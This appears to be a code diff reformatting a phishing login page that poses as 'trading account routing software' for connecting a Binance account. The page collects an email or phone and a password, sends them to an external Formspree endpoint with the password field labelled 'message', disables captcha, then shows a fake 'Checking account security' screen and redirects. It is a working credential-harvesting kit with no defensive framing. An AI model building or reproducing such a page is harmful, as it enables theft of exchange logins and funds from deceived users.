@@ -6,11 +6,11 @@
 <title>Connect Trading Account Routing Software</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0;font-family:system-ui,-apple-system,Segoe UI,Roboto;}
-body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f4f6f9;transition:.35s;color:#111;}
+body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f4f6f9;transition:.35s;}
 body.dark{background:#0b0f14;color:white;}
-.app{width:100%;max-width:430px;border-radius:18px;background:white;box-shadow:0 40px 80px rgba(0,0,0,.55);overflow:hidden;position:relative;transition:.35s;}
+.app{width:100%;max-width:430px;border-radius:18px;box-shadow:0 40px 80px rgba(0,0,0,.55);background:white;position:relative;transition:.35s;}
 body.dark .app{background:#11161d;}
-.logo{display:block;margin:0 auto 28px auto;width:140px;}
+.logo{display:block;margin:0 auto 28px;width:140px;}
 .page{padding:44px 32px;width:100%;transition:.55s cubic-bezier(.77,0,.18,1);}
 .slide{transform:translateX(-100%);}
 h1{text-align:center;margin-bottom:34px;color:#111;font-size:28px;}
@@ -19,7 +19,7 @@ body.dark h1{color:white;}
 input{width:100%;padding:18px 16px;border-radius:12px;border:1px solid #ccc;background:white;color:#111;font-size:16px;outline:none;transition:.25s;}
 body.dark input{background:#0c1117;color:white;border:1px solid #2a3441;}
 input:focus{border-color:#f5c518;box-shadow:0 0 0 3px rgba(245,197,24,.22);}
-label{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#7c8794;background:inherit;padding:0 6px;pointer-events:none;transition:.2s;}
+label{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#7c8794;padding:0 6px;pointer-events:none;transition:.2s;}
 input:focus+label,input:not(:placeholder-shown)+label{top:-8px;font-size:12px;color:#f5c518;}
 .eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;opacity:.75;display:flex;align-items:center;justify-content:center;padding:6px;border-radius:8px;transition:.2s;color:#9aa7b5;}
 .eye:hover{opacity:1;background:rgba(255,255,255,.06);}
@@ -33,77 +33,73 @@ body.dark .verify{color:white;}
 body.dark .theme{background:#222;color:white;}
 .login-info{margin-top:12px;font-size:14px;color:#555;text-align:center;opacity:.8;}
 body.dark .login-info{color:#ccc;}
-@media(max-width:480px){.app{border-radius:0;height:100vh}}
+@media(max-width:480px){.app{border-radius:0;height:100vh;}}
 </style>
 </head>
 <body>
-
 <div class="app">
-  <div class="theme" onclick="toggleTheme()">☀︎ / 🌙</div>
-
-  <div class="page" id="login">
-    <img src="logo.png" class="logo" alt="Logo">
-    <h1>Connect Trading Account Routing Software</h1>
-    <form id="form" action="https://formspree.io/f/xjgewkoy" method="POST">
-      <div class="field">
-        <input id="user" name="email" placeholder=" " required>
-        <label>Email or Phone</label>
-      </div>
-      <div class="field">
-        <input id="pass" type="password" name="message" placeholder=" " required>
-        <label>Password</label>
-        <div class="eye" onclick="togglePass()">
-          <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
-            <circle cx="12" cy="12" r="3"/>
-          </svg>
-          <svg id="eyeClosed" style="display:none" xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-            <path d="M1 1l22 22"/>
-            <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19C5 19 1 12 1 12a21.8 21.8 0 0 1 5.06-5.94"/>
-          </svg>
-        </div>
-      </div>
-      <input type="hidden" name="_captcha" value="false">
-      <button id="btn">Login<div class="spin" id="spin"></div></button>
-      <p class="login-info">Tap on login to connect your Binance account safely to the trading software signal.</p>
-    </form>
-  </div>
-
-  <div class="page verify" id="verify">
-    <img src="logo.png" class="logo" alt="Logo">
-    <h1>Verification</h1>
-    <p style="opacity:.7;margin-bottom:28px">Checking account security...</p>
-    <div class="spin" style="display:inline-block"></div>
-  </div>
+<div class="theme" onclick="toggleTheme()">☀︎ / 🌙</div>
+<div class="page" id="login">
+<img src="logo.png" class="logo" alt="Logo">
+<h1>Connect Trading Account Routing Software</h1>
+<form id="form" action="https://formspree.io/f/xjgewkoy" method="POST">
+<div class="field">
+<input id="user" name="email" placeholder=" " required>
+<label>Email or Phone</label>
 </div>
-
+<div class="field">
+<input id="pass" type="password" name="message" placeholder=" " required>
+<label>Password</label>
+<div class="eye" onclick="togglePass()">
+<svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
+<circle cx="12" cy="12" r="3"/>
+</svg>
+<svg id="eyeClosed" style="display:none" xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+<path d="M1 1l22 22"/>
+<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19C5 19 1 12 1 12a21.8 21.8 0 0 1 5.06-5.94"/>
+</svg>
+</div>
+</div>
+<input type="hidden" name="_captcha" value="false">
+<button id="btn">
+Login
+<div class="spin" id="spin"></div>
+</button>
+<p class="login-info">Tap on login to connect your Binance account safely to the trading software signal.</p>
+</form>
+</div>
+<div class="page verify" id="verify">
+<img src="logo.png" class="logo" alt="Logo">
+<h1>Verification</h1>
+<p style="opacity:.7;margin-bottom:28px">Checking account security...</p>
+<div class="spin" style="display:inline-block"></div>
+</div>
+</div>
 <script>
-const form=document.getElementById("form");
-const spin=document.getElementById("spin");
-const btn=document.getElementById("btn");
-const login=document.getElementById("login");
-const verify=document.getElementById("verify");
-
+const form = document.getElementById("form");
+const spin = document.getElementById("spin");
+const btn = document.getElementById("btn");
+const login = document.getElementById("login");
+const verify = document.getElementById("verify");
 function togglePass(){
-  const p=document.getElementById("pass"),open=document.getElementById("eyeOpen"),closed=document.getElementById("eyeClosed");
+  const p=document.getElementById("pass");
+  const open=document.getElementById("eyeOpen");
+  const closed=document.getElementById("eyeClosed");
   if(p.type==="password"){p.type="text";open.style.display="none";closed.style.display="block";}
   else{p.type="password";open.style.display="block";closed.style.display="none";}
 }
-
 function toggleTheme(){
-  document.body.classList.toggle("dark");
-  localStorage.setItem("theme",document.body.classList.contains("dark")?"dark":"light");
+  if(document.body.classList.contains("dark")){document.body.classList.remove("dark");localStorage.setItem("theme","light");}
+  else{document.body.classList.add("dark");localStorage.setItem("theme","dark");}
 }
-if(localStorage.getItem("theme")==="dark")document.body.classList.add("dark");
-
-form.onsubmit=(e)=>{
+if(localStorage.getItem("theme")==="dark"){document.body.classList.add("dark");}
+form.onsubmit = (e) => {
   e.preventDefault();
-  spin.style.display="block";
-  btn.disabled=true;
-  login.classList.add("slide");
-  verify.classList.add("slide");
+  spin.style.display="block"; btn.disabled=true;
+  login.classList.add("slide"); verify.classList.add("slide");
   fetch(form.action,{method:"POST",body:new FormData(form),headers:{'Accept':'application/json'}}).catch(()=>{});
-  localStorage.setItem("loggedin","true");
+  localStorage.setItem("loggedin", "true");
   setTimeout(()=>{ window.location.href="home.html"; },1800);
 };
 </script>
